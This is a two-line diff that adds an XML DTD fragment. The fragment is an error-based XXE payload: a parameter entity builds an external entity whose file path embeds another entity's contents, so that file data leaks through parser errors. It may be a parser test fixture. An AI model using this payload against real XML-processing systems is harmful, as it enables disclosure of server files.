@@ -1,0 +1,2 @@
+<!ENTITY % eval "<!ENTITY xxe SYSTEM 'file:///nonexistent/%data;'>">
+%eval;
